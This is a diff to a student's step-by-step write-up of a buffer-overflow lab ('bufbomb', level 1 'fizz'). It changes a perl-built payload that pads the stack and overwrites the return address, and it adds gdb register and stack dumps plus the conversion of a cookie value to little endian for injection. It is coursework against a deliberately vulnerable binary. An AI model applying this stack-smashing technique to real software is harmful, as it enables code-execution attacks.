@@ -43,9 +43,10 @@ the id "quinnliu" at the location 0x8(%ebp)
 
 Now create this new file with the address of fizz you wrote down earlier:
 ```
-unix> perl -e 'print "61 "x32, "5f 90 04 08 ", "BB "x4, "CC "x4 '>hexlevel1
+unix> perl -e 'print "61 "x44, "5f 90 04 08 ", "BB "x4, "CC "x4 '>hexlevel1
 unix> ./hex2raw < hexlevel1 > raw
 ```
+Note that "61 " is added 44 times instead of 32 like in level 0.
 
 Now type:
 ```
@@ -60,7 +61,7 @@ Which gives you:
 (gdb) run -u quinnliu < raw
 Starting program: /home/ugrads/majors/quinnliu/Desktop/ComputerOrganizationII/buflab-handout/bufbomb -u quinnliu < raw
 Userid: quinnliu
-Cookie: 0x2d8cc70c
+Cookie: 0x2d8cc70c # <============================================== WRITE DOWN
 
 Breakpoint 1, 0x08049065 in fizz ()
 Missing separate debuginfos, use: debuginfo-install glibc-2.12-1.47.el6_2.5.i686
@@ -86,6 +87,8 @@ Dump of assembler code for function fizz:
 End of assembler dump.
 ```
 
+<b>write down the Cookie address. Mine is 0x2d8cc70c</b>
+
 Now type:
 ```(gdb) i r``` 
 
@@ -95,7 +98,7 @@ And you will get:
 (gdb) i r
 eax            0x1      1
 ecx            0xa      10
-edx            0xbe4334 12469044
+edx            0x654334 6636340
 ebx            0x0      0
 esp            0x5568333c       0x5568333c
 ebp            0x55683354       0x55683354
@@ -109,13 +112,14 @@ ds             0x2b     43
 es             0x2b     43
 fs             0x0      0
 gs             0x63     99
+
 ```
 
 Now we take the address at %ebp and add 0x8 to get the address of where it will grab the value to compare to the cookie "quinnliu"
 
 addressAt%ebp = 0x55683354
 
-addressAt%ebp+8 = 0x55683354 + 8 using the hex calculator from level 0
+addressAt%ebp+8 = 0x55683354 + 0x8 using the hex calculator from level 0
                 = 0x5568335C
 
 Now type:
@@ -124,5 +128,28 @@ Now type:
 Gives you:
 ```
 (gdb) x/ 0x5568335C
-0x5568335c <_reserved+1037148>: 0x004ae610
+0x5568335c <_reserved+1037148>: -858993460
 ```
+
+Now type ```x/20x $esp``` to examine the stack.
+
+Gives you:
+```
+(gdb) x/20x $esp
+0x5568333c <_reserved+1037116>: 0x61616161      0x61616161      0x61616161      0x61616161
+0x5568334c <_reserved+1037132>: 0x61616161      0x61616161      0x61616161      0xbbbbbbbb
+0x5568335c <_reserved+1037148>: 0xcccccccc      0x55686000      0x00000c60      0x55685ff0
+0x5568336c <_reserved+1037164>: 0x00510610      0x006534e0      0x37ba3039      0x5568338c
+0x5568337c <_reserved+1037180>: 0x00000000      0x55685ff0      0x08048d3c      0x08049f3b
+```
+
+By examining the stack we can see where -858993460 sits in relation to our buffer overflow.
+
+In the buffer overlow I will be replacing the "0xcccccccc" with the cookie I wrote down earlier.
+
+0x2d8cc70c # I told you to write it down earlier
+
+Now convert to little endian format
+
+ Original hex id: 0x 2d 8c c7 0c
+little endian id: 0x 0c c7 8c 2d
